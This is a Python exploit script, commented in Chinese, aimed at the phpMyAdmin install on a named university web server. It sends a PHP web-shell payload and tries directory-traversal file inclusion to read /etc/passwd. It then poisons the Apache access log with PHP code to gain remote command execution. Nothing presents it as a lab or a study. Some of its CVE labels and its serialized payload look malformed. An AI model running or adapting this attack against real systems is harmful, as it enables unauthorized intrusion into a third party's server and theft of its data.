#!/usr/bin/env python3
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"

# phpMyAdmin 4.0.2 CVE-2013-3238 反序列化漏洞
print("[*] 利用CVE-2013-3238反序列化漏洞...")

# 构造恶意序列化payload
malicious_payload = 'O:8:"stdClass":1:{s:4:"test";s:10:"<?php system($_GET[\'c\']); ?>";}'

# 尝试多个入口点
exploit_paths = [
    ("index.php", {"target": "db_sql.php%253f/../../../../../../../../tmp/shell.php", "pma_servername": malicious_payload}),
    ("import.php", {"target": "../../../../tmp/shell.php", "pma_servername": malicious_payload}),
]

for path, params in exploit_paths:
    resp = requests.get(url + path, params=params, verify=False, timeout=5)
    if resp.status_code == 200:
        print(f"[*] {path} 响应正常")

# phpMyAdmin 4.0.2 其他已知漏洞
print("[*] 尝试其他CVE漏洞...")

# CVE-2012-5159: SQL注入可能导致RCE
# CVE-2013-3238: 反序列化漏洞
# CVE-2014-8959: 文件包含漏洞

# 尝试文件包含
include_paths = [
    "index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd",
    "import.php?target=../../../../etc/passwd",
    "server_import.php?target=../../../../etc/passwd",
]

for inc_path in include_paths:
    resp = requests.get(url + inc_path, verify=False, timeout=5)
    if "root:" in resp.text:
        print(f"[+] 文件包含成功: {inc_path}")
        # 尝试包含日志文件写入shell
        log_inc = inc_path.replace("/etc/passwd", "/var/log/apache2/access.log")
        # 先访问写入PHP代码
        php_code = "<?php system($_GET['c']); ?>"
        requests.get(url + f"index.php?target={php_code}", verify=False, timeout=5)
        # 包含日志
        shell_resp = requests.get(url + log_inc + "&c=id", verify=False, timeout=5)
        if "uid=" in shell_resp.text:
            print(f"[+] Shell获取成功: {url}{log_inc}&c=id")
            exit(0)

print("[-] CVE漏洞利用失败")
